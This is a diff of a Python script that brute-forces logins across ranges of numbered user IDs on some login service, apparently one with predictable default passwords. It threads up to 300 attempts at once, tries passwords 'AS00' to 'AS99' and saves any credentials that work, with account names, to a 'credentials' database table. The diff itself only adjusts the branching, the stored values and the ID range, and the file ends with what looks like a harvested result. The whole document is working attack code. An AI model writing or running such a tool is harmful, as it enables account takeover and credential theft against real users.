@@ -21,24 +21,27 @@ insert_query = f"INSERT INTO credentials VALUES(%s, %s, %s, %s);"
 def login(user_id, password, cursor=cursor):
     req = Login(user_id, password)
     if req.is_logged_in():
-        cursor.execute(insert_query, (user_id, password, "True", req.get_user_name()))
+        cursor.execute(insert_query, (user_id, password, "true", req.get_user_name()))
         print(f'Success {user_id}')
-    else:
+    
+    if req.is_username_possible():
         print(f'Broteforse {user_id}')
         broute_force(user_id, set(password))
+    else:
+        print(f"Failed {user_id}")
     
 
 def broute_force(user_id: str, exclude=set(), cursor=cursor):
     for password in range(100):
         password = f"AS{password}" if password > 9 else f"AS0{password}"
         req = Login(user_id, password)
-
+        
         if req.is_logged_in() and password not in exclude:
-            cursor.execute(insert_query, (user_id, password, "True", req.get_user_name()))
+            cursor.execute(insert_query, (user_id, password, "true", req.get_user_name()))
             print(f'Success {user_id}')
             return
         # print(f'Retrying {user_id}')
-    cursor.execute(insert_query, (user_id, password, "False", "n/a"))
+    cursor.execute(insert_query, (user_id, password, "false", "n/a"))
     print(f'Failure {user_id}')
     
 
@@ -73,7 +76,7 @@ def main(start: int, end: int, max_threads=300):
     db.commit()
     db.close()
 
-main(15000, 17000)
+main(10000, 12000)
 
 '''
 HZ15000 AS10
